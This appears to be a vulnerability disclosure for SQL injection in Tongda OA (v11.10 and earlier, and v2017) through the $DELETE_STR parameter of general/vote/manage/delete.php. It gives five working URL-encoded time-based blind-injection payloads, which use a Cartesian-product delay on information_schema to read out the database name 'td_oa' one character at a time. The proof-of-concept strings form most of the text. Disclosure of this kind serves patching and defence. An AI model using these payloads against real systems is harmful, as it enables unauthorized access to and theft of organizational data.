SQL injection vulnerability exists in Tongda OA

version：Tongda<=v11.10、=v2017 version

Route: general/vote/manage/delete.php

There is an injected parameter: $DELETE_STR

The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/Martinzb/cve/assets/152675584/6fdf7d19-4894-4739-b126-701256ee22cd)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/Martinzb/cve/assets/152675584/75950853-a45c-4f2b-9c49-3811b4ca7624)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

POC
```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/Martinzb/cve/assets/152675584/53df8798-8a7b-4470-9ed2-806eac7914bf)

The third digit is the character _

POC
```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/Martinzb/cve/assets/152675584/6a1705e7-1446-48b8-9a1a-76d79cf17803)

The fourth digit is the character o
POC
```
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/Martinzb/cve/assets/152675584/58cc60d9-472e-42a0-a974-4ccd9fb17223)

The fifth digit is the character a

POC
```
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/Martinzb/cve/assets/152675584/438a993d-a35e-48cb-985e-d736e9024517)

Then through blind injection, you can determine that the database name is: td_oa

